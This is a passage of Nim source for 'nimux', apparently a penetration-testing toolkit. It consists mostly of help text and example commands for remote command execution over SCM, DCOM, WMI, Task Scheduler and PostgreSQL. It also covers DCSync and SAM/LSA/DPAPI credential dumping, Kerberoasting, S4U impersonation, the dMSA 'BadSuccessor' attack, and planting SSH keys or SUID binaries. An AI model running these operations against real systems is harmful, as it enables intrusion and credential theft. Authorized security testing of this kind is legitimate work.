                       Download a file
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly <local> [args...]
                       Run a managed .NET assembly

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --timeout <ms>       Per-operation timeout

OUTPUT
  --json               Emit JSON

CAVEATS
  Runs in session 0 as SYSTEM via the Service Control Manager. cmd built-ins
  (dir, echo, type, set, copy) return stdout reliably. Win32 console apps
  (whoami, hostname, tasklist) often inherit NULL stdio handles in session-0
  service context and produce no output - use winrm/wmi/svc for those.

EXAMPLES
  nimux scm dc01 -u Administrator -p Pass --cmd "dir C:\\"
  nimux scm dc01 -u Administrator -H aad3b...:31d6c... --cmd "ipconfig /all"
"""

proc usageFtp() =
  echo """
nimux ftp - FTP authentication check and interactive client

USAGE
  nimux ftp <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username (default: anonymous)
  -p, --password <s>   Password

OPTIONS
  --ls                 List home directory after login
  --cli                Interactive FTP client (ls, cd, get, put, mkdir, rm)
  --port <n>           Custom port (default: 21)

CLI COMMANDS
  help                 Show client help
  exit, quit           Leave the client
  ls [path]            List directory
  cd <path>            Change directory
  pwd                  Print working directory
  whoami               Show current user and host
  get <file>           Download file to current local directory
  put <file>           Upload local file to current remote directory
  mkdir <dir>          Create directory
  rm <path>            Remove file or directory

EXAMPLES
  nimux ftp 10.0.0.5
  nimux ftp 10.0.0.5 -u akira -p chokochoko
  nimux ftp 10.0.0.5 -u akira -p chokochoko --ls
  nimux ftp 10.0.0.5 -u akira -p chokochoko --cli
"""

proc usageMysql() =
  echo """
nimux mysql - MySQL/MariaDB authentication check

USAGE
  nimux mysql <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Password

OPTIONS
  --cli                Interactive MySQL client
  --port <n>           Custom port (default 3306)

CLI COMMANDS
  help                 Show client help
  exit, quit           Leave the client
  use <db>             Switch database
  dbs                  List databases
  tables               List tables in current database
  whoami               Show current user and host
  <sql>                Execute any SQL statement
  <sql> \              Continue SQL on the next line

EXAMPLES
  nimux mysql 10.0.0.5 -u akira -p chokochoko
  nimux mysql 10.0.0.5 -u root -p ''
  nimux mysql 10.0.0.5 -u root -p '' --cli
"""

proc usagePostgres() =
  echo """
nimux postgres - PostgreSQL authentication check and interactive client

USAGE
  nimux postgres <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Password

OPTIONS
  --database <s>       Initial database (default: postgres)
  --ssl                Request TLS
  --query <sql>        Run a SQL query and display results
  --cmd <command>      Run OS command via COPY FROM PROGRAM (requires superuser)
  --shell              Interactive OS shell via COPY FROM PROGRAM
  --cli                Interactive PostgreSQL client

CLI COMMANDS
  help                 Show client help
  exit, quit           Leave the client
  whoami               Show current user and database
  databases            List databases
  tables               List tables in current schema search path
  use <db>             Reconnect to another database
  shell <cmd>, !<cmd>  Run OS command via COPY FROM PROGRAM
  <sql>                Execute any SQL statement
  <sql> \              Continue SQL on the next line

SHELL COMMANDS
  help                 Show shell help
  exit, quit           Leave the shell
  cd <path>            Change directory
  upload <local> [r]   Upload a local file to the remote host
  download <remote> [l]
                       Download a remote file
  <command>            Run OS command via COPY FROM PROGRAM

EXAMPLES
  nimux postgres 10.0.0.5 -u postgres -p chokochoko
  nimux postgres 10.0.0.5 -u postgres -p chokochoko --query "SELECT version()"
  nimux postgres 10.0.0.5 -u postgres -p chokochoko --cmd "id"
  nimux postgres 10.0.0.5 -u postgres -p chokochoko --shell
  nimux postgres 10.0.0.5 -u postgres -p chokochoko --database template1 --cli
"""

proc usageNfs() =
  echo """
nimux nfs - NFS/RPC portmapper probe and export enumeration

USAGE
  nimux nfs <target>... [options]

OPTIONS
  --port <n>           Portmapper port (default 111)
  --cli                Interactive NFS client

CLI COMMANDS
  help                 Show client help
  exit, quit           Leave the client
  exports              List available NFS exports
  use <export>         Mount and switch to an export
  ls [path]            List directory
  cd <path>            Change directory
  pwd                  Print current path
  stat <path>          Show file attributes
  cat <file>           Print file contents
  get <file> [local]   Download file
  put <file> [remote]  Upload local file
  chmod <mode> <path>  Change file permissions
  suid <bin> [name]    Upload binary with SUID bit set
  sshkey <pub> [path]  Write SSH public key to authorized_keys

EXAMPLES
  nimux nfs 10.0.0.5
  nimux nfs 10.0.0.5 --port 111
  nimux nfs 10.0.0.5 --cli
"""

proc usageHttp() =
  echo """
nimux http/https - Native HTTP probe

USAGE
  nimux http <target>... [options]
  nimux https <target>... [options]

AUTHENTICATION
  -u, --username <s>   Basic-auth username
  -p, --password <s>   Basic-auth password

OPTIONS
  --path <s>           Request path (default: /)
  --ssl                Use TLS for `http` (implicit for `https`)
  --port <n>           Custom port (default: 80 / 443)
  --json               Emit JSON

EXAMPLES
  nimux http 10.0.0.5
  nimux http 10.0.0.5 --path /admin
  nimux https 10.0.0.5 -u akira -p chokochoko --path /dav/
"""

proc usageSsh() =
  echo """
nimux ssh - SSH-2 authentication check and remote command execution

USAGE
  nimux ssh <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password

EXECUTION
  --cmd <command>      Run a command and return output
  --shell              Open an interactive shell session

EXAMPLES
  nimux ssh 10.0.0.5 -u akira -p chokochoko
  nimux ssh 10.0.0.5 -u akira -p chokochoko --cmd "id"
  nimux ssh 10.0.0.5 -u akira -p chokochoko --shell
"""

proc usageAfp() =
  echo """
nimux afp - Apple Filing Protocol authentication check

USAGE
  nimux afp <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Password

OPTIONS
  --port <n>           Custom port (default: 548)
  --cli                Interactive AFP client (shares, use, ls, cd, get, put, mkdir)

CLI COMMANDS
  help                 Show client help
  exit, quit           Leave the client
  shares               List AFP shares
  use <share>          Select a volume
  ls [path]            List directory
  cd <path>            Change directory
  pwd                  Print current AFP path
  whoami               Show current user and host
  get <file>           Download file
  put <file>           Upload local file to current AFP directory
  mkdir <dir>          Create directory

EXAMPLES
  nimux afp 10.0.0.5
  nimux afp 10.0.0.5 -u akira -p chokochoko
  nimux afp 10.0.0.5 -u akira -p chokochoko --cli
"""

proc usageWebDav() =
  echo """
nimux webdav - WebDAV/WebDAVS authentication check and resource listing

USAGE
  nimux webdav <target>... [options]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Password

OPTIONS
  --ssl                Use HTTPS (WebDAVS)
  --port <n>           Custom port (default: 80, or 443 with --ssl)
  --cli                Interactive WebDAV client (ls, cd, get, put, mkdir, rm)

CLI COMMANDS
  help                 Show client help
  exit, quit           Leave the client
  ls [path]            List directory
  cd <path>            Change directory
  pwd                  Print current path
  whoami               Show current user and host
  get <file>           Download file to current local directory
  put <file>           Upload local file to current remote directory
  mkdir <dir>          Create directory
  rm <path>            Remove file or directory

EXAMPLES
  nimux webdav 10.0.0.5
  nimux webdav 10.0.0.5 -u akira -p chokochoko
  nimux webdav 10.0.0.5 --ssl
  nimux webdav 10.0.0.5 --ssl -u akira -p chokochoko
  nimux webdav 10.0.0.5 --ssl -u akira -p chokochoko --cli
"""

proc usageVnc() =
  echo """
nimux vnc - VNC/RFB authentication check

USAGE
  nimux vnc <target>... [options]

AUTHENTICATION
  -p, --password <s>   VNC password

EXAMPLES
  nimux vnc 10.0.0.5 -p chokochoko
  nimux vnc 10.0.0.5
"""

proc usageKrb5Conf() =
  echo """
nimux krb5conf - Generate a krb5.conf for AD Kerberos tooling

USAGE
  nimux krb5conf <kdc-host> -d <domain> [--realm <REALM>] [--out <file>] [--ca <pem>]

OPTIONS
  -d, --domain <s>     DNS domain, e.g. garfield.htb
  --realm <s>          Kerberos realm (default: uppercase domain)
  --out <file>         Output path (default: ./krb5.conf)
  --ca <file>          Optional CA PEM path for PKINIT anchors
  --json               Emit JSON summary instead of text

EXAMPLES
  nimux krb5conf dc01.garfield.htb -d garfield.htb --out krb5.conf
  nimux krb5conf 10.129.244.207 -d garfield.htb --realm GARFIELD.HTB --ca ca.pem
"""

proc usageKerberos() =
  echo """
nimux kerberos - Native Kerberos ticket operations

USAGE
  nimux kerberos <kdc-host> -d <domain> --request <op> [options]

COMMON REQUESTS
  --request list              Describe a ccache
  --request kinit             Request a TGT
  --request getst             Request a service ticket
  --request kerberoast        Emit a TGS hash for cracking
  --request s4u2self          Request S4U2Self
  --request s4u               Request S4U2Self + S4U2Proxy
  --request ccache-to-kirbi   Convert ccache to kirbi
  --request kirbi-to-ccache   Convert kirbi to ccache
  --request renew             Renew a ccache
  --request purge             Remove a ccache file

AUTHENTICATION
  -u, --username <s>      Username
  -p, --password <s>      Plaintext password
  -H, --hash <s>          NT hash (32 hex) or LM:NT pair
  -d, --domain <s>        Domain / realm source

KERBEROS OPTIONS
  --ccache <file>         Input ccache for cache-backed operations
  --out <file>            Output ccache/kirbi path
  --kirbi <file>          Input/output kirbi path for conversion
  --service <spn>         Target SPN, e.g. cifs/dc01.domain.local
  --spn <spn>             Alias used by LDAP/Kerberos paths for target SPN
  --user <principal>      User to impersonate or roast, depending on request
  --altservice <spn>      Rewrite service in S4U output ticket
  --krb5-config <file>    Kerberos config generated by nimux krb5conf

EXAMPLES
  nimux kerberos dc01.corp.local -d corp.local -u alice -p Pass --request kinit --out alice.ccache
  nimux kerberos dc01.corp.local -d corp.local --request getst --ccache alice.ccache --service cifs/dc01.corp.local --out cifs.ccache
  nimux kerberos dc01.corp.local -d corp.local --request s4u --ccache svc.ccache --user Administrator --service cifs/server.corp.local --out admin-cifs.ccache
  nimux kerberos dc01.corp.local -d corp.local --request kirbi-to-ccache --kirbi ticket.kirbi --out ticket.ccache
"""

proc usage(forCommand = "") =
  case normalizeExecProto(forCommand)
  of "scan": usageScan(); return
  of "smb": usageSmb(); return
  of "ldap": usageLdap(); return
  of "winrm": usageWinrm(); return
  of "mssql": usageMssql(); return
  of "rdp": usageRdp(); return
  of "ssh": usageSsh(); return
  of "vnc": usageVnc(); return
  of "ftp": usageFtp(); return
  of "mysql": usageMysql(); return
  of "postgres": usagePostgres(); return
  of "afp": usageAfp(); return
  of "nfs": usageNfs(); return
  of "webdav": usageWebDav(); return
  of "http", "https": usageHttp(); return
  of "socks": usageSocks(); return
  of "krb5conf", "krb5": usageKrb5Conf(); return
  of "kerberos": usageKerberos(); return
  of "scm": usageSmbexec(); return
  of "bin":
    echo """
nimux bin - Command execution via SCM + a custom Nim helper service

USAGE
  nimux bin <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"

AUTHENTICATION
  -u, --username <s>   Username (typically Administrator or domain admin)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos for SMB session setup (requires a valid
                       local ticket cache; SMB signing is supported)
  --ccache <file>      Ticket cache to use
  --krb5-config <file> Kerberos config generated with nimux krb5conf

EXECUTION
  --cmd <command>      Command to execute. Wrapped in cmd.exe /Q /c on the
                       target. Stdout + stderr stream back through a named
                       pipe - Win32 console exes (whoami, hostname, tasklist)
                       work, unlike service.
  --shell              Interactive shell over the helper service.
  execute-assembly     Available inside --shell for managed .NET assemblies.

SHELL COMMANDS
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file
  download <remote> [l]
                       Download a file
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly <local> [args...]
                       Run a managed .NET assembly

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --timeout <ms>       Per-operation timeout

OUTPUT
  --json               Emit JSON

CAVEATS
  Drops nimuxsvc.exe (~300 KB) on ADMIN$\Temp\, registers it as a service,
  starts it, runs the command, then stops/deletes the service and removes the
  binary. Requires write to ADMIN$ and SCM access (typically local admin).

EXAMPLES
  nimux bin dc01 -u Administrator -p Pass --cmd whoami
  nimux bin dc01 -u Administrator -H aad3b...:31d6c... --cmd "tasklist"
"""
    return
  of "tsch":
    echo """
nimux task - Command execution via Task Scheduler

USAGE
  nimux task <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"

ALIASES
  task, sch, schtask, atexec

AUTHENTICATION
  -u, --username <s>   Username (typically Administrator or domain admin)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos for SMB session setup (requires a valid
                       local ticket cache; SMB signing is supported)

EXECUTION
  --cmd <command>      Command to execute via a temporary scheduled task.
  --shell              Interactive shell using repeated scheduled tasks.

SHELL COMMANDS
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file
  download <remote> [l]
                       Download a file
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly <local> [args...]
                       Run a managed .NET assembly

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --timeout <ms>       Per-operation timeout

OUTPUT
  --json               Emit JSON

EXAMPLES
  nimux task dc01 -u Administrator -p Pass --cmd whoami
  nimux sch dc01 -u Administrator -H aad3b...:31d6c... --cmd "ipconfig /all"
"""
    return
  of "mmc":
    echo """
nimux mmc - Remote command execution via DCOM IDispatch

USAGE
  nimux mmc <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos for DCOM activation/bind and SMB output
                       retrieval via the local ticket cache.

EXECUTION
  --cmd <command>      Command to run; output captured to C:\Windows\Temp\<rand>.out
  --shell              Interactive shell using repeated DCOM execution.
  --object <name>      DCOM object to use (default: MMC20)
                         MMC20               - {49B2791A-...} Document.ActiveView.ExecuteShellCommand
                         ShellWindows        - {9BA05972-...} Item(0).Document.Script.ShellExecute
                         ShellBrowserWindow  - {C08AFD90-...} Document.Script.ShellExecute

SHELL COMMANDS
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file
  download <remote> [l]
                       Download a file
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly <local> [args...]
                       Run a managed .NET assembly

PROTOCOL TUNING
  --port <n>           Endpoint Mapper port (default 135)
  --timeout <ms>       Per-operation timeout

EXAMPLES
  nimux mmc dc01 -u Administrator -p Pass --cmd whoami
  nimux mmc dc01 -u Administrator -p Pass --cmd whoami --object ShellWindows
  nimux mmc dc01 -u Administrator -H aad3b...:31d6c... --cmd "ipconfig /all"
"""
    return
  of "dcsync":
    echo """
nimux dcsync - Dump credentials via native MS-DRSR DCSync

USAGE
  nimux dcsync <dc> -u <user> {-p <pass>|-H <hash>} -d <domain> [--user <target>]

AUTHENTICATION
  -u, --username <s>   Username (must have Replicating Directory Changes privileges)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain (required)

TARGET
  --user <account>     Dump a specific account (DOMAIN\user or user@domain).
                       Omit to dump all accounts from the domain NC.

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --timeout <ms>       Per-operation timeout (default 10000)

OUTPUT
  --json               Emit JSON (one object per line)

EXAMPLES
  nimux dcsync dc01 -u Administrator -p Pass -d CORP --user "CORP\\krbtgt"
  nimux dcsync dc01 -u Administrator -H aad3b...:31d6c... -d CORP
"""
    return
  of "secrets":
    echo """
nimux secrets - Dump SAM hashes, LSA secrets, cached creds, domain backup key and DPAPI credentials via SMB/MS-RRP

USAGE
  nimux secrets <target> -u <user> {-p <pass>|-H <hash>} [-d <domain>] [options]
  nimux secrets <target> -k [-u <user>] [-d <domain>] [options]

AUTHENTICATION
  -u, --username <s>   Username (local or domain admin)
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain (optional for local accounts)
  -k, --kerberos       Use Kerberos auth (requires KRB5CCNAME with cifs/ ticket)

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --timeout <ms>       Per-operation timeout (default 10000)

OUTPUT
  --json               Emit JSON

ONLINE DPAPI DECRYPTION
  --online             For credentials that cannot be decrypted offline (master key not found
                       or password changed), execute ProtectedData::Unprotect on the target
                       via code execution. Tries exec methods in order: winrm → svc → wmi → atexec.
  --exec <method>      Force a specific exec method for --online:
                         winrm    WinRM / PowerShell Remoting (port 5985)
                         svc      SMB service (CIFS-only, no WinRM needed)
                         wmi      DCOM / WMI Win32_Process
                         atexec   Task Scheduler via MS-TSCH
                         dcom     DCOM ShellWindows

WHAT IT DUMPS
  - SAM hashes (local accounts)
  - LSA secrets: $MACHINE.ACC, DefaultPassword, DPAPI_SYSTEM, service account passwords
  - Domain DPAPI backup key (RSA private key via LsarRetrievePrivateData)
  - DPAPI master keys (S-1-5-18, S-1-5-18\User, service profiles)
  - DPAPI credentials and vaults (systemprofile, LocalService, NetworkService, user profiles)
  - GPP passwords from SYSVOL (Groups.xml, Services.xml, etc.)
  - Cached domain logons (DCC2/mscache2)
  - Kerberos keys via DCSync

EXAMPLES
  nimux secrets 192.168.1.10 -u Administrator -p Password123
  nimux secrets dc01.corp.local -u CORP\\admin -H <nthash> -d corp.local
  KRB5CCNAME=admin.ccache nimux secrets dc01.corp.local -k -u Administrator -d CORP
  nimux secrets dc01.corp.local -u Administrator -H <nthash> -d corp.local --online
  nimux secrets dc01.corp.local -u Administrator -H <nthash> -d corp.local --online --exec svc
"""
    return
  of "cim":
    echo """
nimux cim - Remote command execution via DCOM / WMI Win32_Process.Create

USAGE
  nimux cim <target> -u <user> {-p <pass>|-H <hash>} --cmd "<command>"

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain
  -k, --kerberos       Use Kerberos for DCOM/WMI bind and SMB output
                       retrieval via the local ticket cache.

EXECUTION
  --cmd <command>      Command to run; wrapped in cmd.exe /Q /c <cmd> >
                       C:\Windows\Temp\<rand>.out 2>&1 for output capture.
  --shell              Interactive shell (persistent prompt, command history)

SHELL COMMANDS
  help, /help          Show shell help
  exit, quit           Close the shell
  cd <path>            Change remote directory
  upload <local> [r]   Upload a file
  download <remote> [l]
                       Download a file
  upload-dir <l> [r]   Upload a directory recursively
  download-dir <r> [l] Download a directory recursively
  execute-assembly <local> [args...]
                       Run a managed .NET assembly

PROTOCOL TUNING
  --port <n>           Endpoint Mapper port (default 135). The dynamic
                       WMI service port is discovered automatically via
                       ResolveOxid2 after DCOM activation.
  --timeout <ms>       Per-operation timeout

EXAMPLES
  nimux cim dc01 -u Administrator -p Pass --cmd "ipconfig /all"
  nimux cim dc01 -u Administrator -H 31d6cfe0...:31d6cfe0... --cmd whoami
  nimux cim dc01 -u Administrator -p Pass --shell
"""
    return
  of "ls":
    echo """
nimux ls - List a directory inside an SMB share (SMB2 QUERY_DIRECTORY)

USAGE
  nimux ls <target> -u <user> {-p <pass>|-H <hash>} \
      --share <ShareName> [--remote <path-on-share>]

  --share <name>       Share to mount, e.g. C$, ADMIN$, Users, Public
  --remote <path>      Subdirectory inside the share. Omit for share root.
  --recursive          Recurse into child directories.

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash or LM:NT
  -d, --domain <s>     Domain

EXAMPLES
  nimux ls dc01 -u admin -p Pass --share C\$
  nimux ls dc01 -u admin -p Pass --share Users --remote 'Public\Documents'
"""
    return
  of "put", "get", "rm", "mkdir":
    echo """
nimux """ & forCommand & """ - SMB share file/directory operation

USAGE
  nimux """ & forCommand & """ <target> -u <user> {-p <pass>|-H <hash>} \
      --share <ShareName> --remote <path-on-share> [--local <local-path>]

AUTHENTICATION
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex) or LM:NT pair
  -d, --domain <s>     Domain

PATH OPTIONS
  --share <name>       Share to mount, e.g. ADMIN$, C$, Users, MyShare
  --remote <path>      Path on the share, e.g. Temp\file.txt or ProgramData\foo.bin
  --local <path>       Local filesystem path (source for put, dest for get)
  --recursive          Recurse for ls/get. For put, uploads a local directory
                       recursively into --remote.

PROTOCOL TUNING
  --port <n>           SMB port (default 445)
  --timeout <ms>       Per-operation timeout

EXAMPLES
  nimux put dc01 -u admin -p Pass \
      --share ADMIN$ --remote Temp\loader.exe --local ./loader.exe
  nimux get dc01 -u admin -p Pass \
      --share C$ --remote 'Users\Public\out.txt' --local ./out.txt
  nimux mkdir dc01 -u admin -p Pass --share C$ --remote Temp\nimux
  nimux rm dc01 -u admin -p Pass --share C$ --remote Temp\nimux\file.txt
"""
    return
  else: discard
  echo bannerBlue("""
        _                      
 _ __  (_)_ __ ___  _   ___  __
| '_ \ | | '_ ` _ \| | | \ \/ /
| | | || | | | | | | |_| |>  < 
|_| |_||_|_| |_| |_|\__,_/_/\_\
nimux v""" & Version & """ - pure-Nim network enumeration & exec toolkit
Author: """ & Author & """
""") & "\n\n" & bannerRed("NOTICE: nimux is a security assessment toolkit for authorized testing only. Do not use it against third-party systems without written permission. Developers are not responsible for misuse, damage, or legal consequences.") & "\n\n" & helpDimGray("""
USAGE
  nimux <command> <target>... [options]

COMMANDS
  scan      Port scanner with service detection (TCP + UDP, IPv4 + IPv6)
  smb       SMB enumeration: shares, users, groups, sessions, RID-brute, ...
  ldap      LDAP/AD query and write engine: search, add, modify, delete, LDIF, RBCD
  kerberos  Kerberos ticket ops: kinit, getST, S4U, roast, ccache/kirbi conversion
  krb5conf  Generate krb5.conf for AD Kerberos tooling
  ssh       SSH-2 auth check and remote command / interactive shell
  vnc       VNC/RFB authentication check (VNC auth + None security)
  ftp       FTP authentication check and server fingerprint
  mysql     MySQL/MariaDB authentication check + interactive client
  postgres  PostgreSQL auth check, SQL client, OS shell (COPY FROM PROGRAM)
  nfs       NFS/RPC portmapper probe, service enum, export listing
  afp       AFP (Apple Filing Protocol) server info and authentication
  webdav    WebDAV/WebDAVS authentication check and resource listing
  http      HTTP/HTTPS probe, headers, title, and body fingerprinting
  winrm     WinRM auth check + remote command execution (NTLM / Kerberos)
  mssql     MSSQL prelogin + Login7 auth, raw T-SQL queries, xp_cmdshell
  rdp       RDP probe with TLS cert + NTLM-info (nmap rdp-ntlm-info parity)
  socks     SOCKS proxy over WinRM using the embedded Nim helper
  scm       Command execution via SCM (alias: service)
  cim       Command execution via DCOM / WMI Win32_Process.Create (alias: wmi)
  bin       Command execution via SCM + custom Nim helper service (aliases: psexec, svc)
  tsch      Command execution via Task Scheduler (aliases: task, sch, atexec)
  mmc       Command execution via DCOM IDispatch (aliases: com, dcom)
  dcsync    Native MS-DRSR DCSync
  secrets   Dump SAM, LSA secrets, cached creds, DPAPI material via SMB/MS-RRP
  put       Upload a local file to \\<target>\<share>\<remote-path>
  get       Download a remote file from \\<target>\<share>\<remote-path>
  ls        List a directory inside an SMB share (SMB2 QUERY_DIRECTORY)
  mkdir     Create a directory inside an SMB share
  rm        Delete a file inside an SMB share

TARGETS
  Each command accepts one or more of the following:
    <host>              Hostname or IPv4/IPv6 literal (e.g. 10.0.0.1, ::1)
    <cidr>              IPv4 /16+ or IPv6 /112+ (e.g. 10.0.0.0/24, 2001:db8::/120)
    <a.b.c.d-e.f.g.h>   IPv4 inclusive range
    @path/to/file       Newline-separated list of any of the above

GENERAL
  --port <spec>        TCP/UDP port; scan accepts lists/ranges/all
                       e.g. 22,80,8000-8100  or  all
  --concurrency <n>    Concurrent sockets (default 256)
  --timeout <ms>       Per-connection timeout (default 1500)
  --retries <n>        Retry timeout/error probes (default 0)
  --json               Emit one JSON object per result on stdout
  --log <file>         Append JSON results to a log file
  --rollback-out <file>
                       Append JSONL rollback records for supported AD writes
  --dry-run            LDAP generic writes/LDIF: show planned operations only
  --no-color           Disable ANSI colors (also honors NO_COLOR env var)
  -h, --help           Show this help

AUTHENTICATION (smb, ldap, winrm, mssql, service, svc, wmi, com)
  -u, --username <s>   Username
  -p, --password <s>   Plaintext password
  -H, --hash <s>       NT hash (32 hex chars) or LM:NT pair
  -d, --domain <s>     Domain / workgroup (default: auto-detect from challenge)
  --local-auth         Force local-account authentication context

SCAN
  --open               Show only open ports in text output
  --udp                UDP scan with per-port datagram probes
                       (silent ports report open|filtered)
  --debug-probe        Dump raw probe response bytes (hex + ASCII) per port
  --encrypt <n>        MSSQL prelogin encryption byte (default 0)
  --rdp-proto <n>      RDP requested protocol mask (default 3 = TLS|CredSSP)

SMB enumeration (--users, --groups, ... require -u/-p or -H)
  --shares             Enumerate shares via SRVSVC
  --users              Enumerate domain users via SAMR
  --groups             Enumerate domain groups + local aliases via SAMR
  --pass-pol           Query domain password / lockout policy via SAMR
  --loggedon-users     Currently logged-on users via WKSSVC
  --sessions           Active SMB sessions via SRVSVC
  --disks              Server disks via SRVSVC
  --rid-brute [n]    LSARPC RID brute, optional max RID (default 4000)
  --rid-range <a-b>    Explicit RID brute range (e.g. 500-1500)
  --dialects <list>    SMB dialects, e.g. 0202,0210,0300,0302

LDAP query/write
  --computers          Enumerate computer accounts
  --asreproast         Accounts with DONT_REQ_PREAUTH set
  --kerberoast         Accounts with servicePrincipalName
  --trusts             trustedDomain objects
  --gpos               Group policy containers
  --dcs                Domain controllers (UAC SERVER_TRUST_ACCOUNT)
  --admins             Domain/Enterprise/Schema Admins members
  --dns                DNS zones (DomainDnsZones partition)
  --cert-inventory     Accounts with userCertificate, altSecurityIdentities, or KeyCredentialLink
  --create <type>      Create user, computer, group, or dmsa (dMSA bad-successor) with --name
  --target-dn <dn>     Preceding MSA DN for --create dmsa (BadSuccessor attack)
  --modify --dn <dn>   Modify object with --add/--replace/--delete attr=value
  --delete --dn <dn>   Delete object
  --ldif <file>        Apply LDIF batch
  --set-rbcd           Configure RBCD with --from and --to
  --limit <n>          Per-query size limit (default 1000)

PROTOCOL-SPECIFIC
  --cmd <command>      Command to run (winrm, service, mssql xp_cmdshell)
  --query <spec>       Raw T-SQL (mssql) or LDAP named query (ldap)
  --filter <filter>    Raw LDAP filter, e.g. --filter "(cn=A*)"
  --request <op>       Kerberos op: kinit, getst, s4u, constrained,
                       describe/list, renew, purge, ccache-to-kirbi,
                       kirbi-to-ccache
  --ccache <file>      Kerberos ccache input/output for -k and kerberos ops
  --kirbi <file>       Kerberos KRB-CRED .kirbi input/output for conversion
  --path <path>        WinRM HTTP path (default /wsman)
  --ssl                Use TLS for WinRM
  -k, --kerberos       Use Kerberos auth where implemented (WinRM, MSSQL,
                       service/svc SMB session setup)

EXAMPLES
  Discovery
    nimux scan 10.0.0.0/24
    nimux scan dc01 --port 88,135,139,389,445,464,593,3389 --open
    nimux scan dc01 --udp --port 53,88,123,137,161,464
    nimux scan 2001:db8::1 --port 22,80,443

  SMB / AD enumeration
    nimux smb dc01 -u alice -p Pass123! --shares --users --pass-pol
    nimux smb dc01 -u alice -H aad3b...:31d6c... --rid-brute 5000
    nimux ldap dc01 --query dcs --query kerberoast --query trusts
    nimux ldap dc01 -u alice -p Pass -d corp.local --create computer --name <computer-name>$ --new-pass 'Passw0rd!123'
    nimux ldap dc01 -u ryan.brooks -k -d corp.local --create dmsa --name fakeDMSA --ou "OU=DMSAHolder,DC=corp,DC=local" --target-dn "CN=svc_deploy,OU=ServiceAccounts,DC=corp,DC=local" --out fakeDMSA.ccache
    nimux kerberos dc01 -u alice -p Pass -d corp.local --request kinit --out alice.ccache
    nimux kerberos dc01 --request describe --ccache alice.ccache --json
    nimux kerberos dc01 --request ccache-to-kirbi --ccache alice.ccache --out alice.kirbi
    nimux kerberos dc01 --request kirbi-to-ccache --kirbi alice.kirbi --out alice.ccache

  Authenticated execution
    nimux winrm dc01 -u admin -p Pass --cmd "Get-Process | select -f 5"
    nimux scm dc01 -u admin -H aad3b...:31d6c... --cmd "dir C:\\"
    nimux bin     dc01 -u admin -p Pass --cmd whoami
    nimux mssql sql01 -u sa -p Pass --query "SELECT @@version"
    nimux mssql sql01 -u sa -p Pass --cmd "ipconfig /all"

  Output
    nimux scan 10.0.0.0/24 --json > scan.jsonl
    nimux smb dc01 -u alice -p Pass --shares --json
""")

proc parsePortSpec(value: string): seq[int] =
  for item in value.split(','):
    let clean = item.strip().toLowerAscii()
    if clean.len == 0:
      continue
    if clean in ["all", "-"]:
      for port in 0 .. 65535:
        result.add port
    elif '-' in clean:
      let parts = clean.split('-')
      if parts.len != 2 or parts[0].len == 0 or parts[1].len == 0:
        raise newException(ValueError, "invalid port range: " & item)
      let first = parseInt(parts[0])
      let last = parseInt(parts[1])
      if first < 0 or first > 65535:
        raise newException(ValueError, "port out of range: " & $first)
      if last < 0 or last > 65535:
        raise newException(ValueError, "port out of range: " & $last)
      if last < first:
        raise newException(ValueError, "port range end before start: " & item)
      for port in first .. last:
        if port notin result:
          result.add port
    else:
      let port = parseInt(clean)
      if port < 0 or port > 65535:
        raise newException(ValueError, "port out of range: " & $port)
      if port notin result:
        result.add port

const CommonScanPorts = [
  21, 22, 23, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 443, 445,
  464, 465, 587, 593, 636, 993, 995, 1433, 1521, 2049, 2179, 3268, 3269, 3306, 3389,
  5432, 5985, 5986, 6379, 8000, 8008, 8080, 8081, 8443, 8888, 9200,
  9300, 11211, 27017
]

const TopTcpPorts = [
  80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723,
  111, 995, 993, 5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000,
  514, 5060, 179, 1026, 2000, 8443, 8000, 32768, 554, 26, 1433, 49152, 2001, 515, 8008,
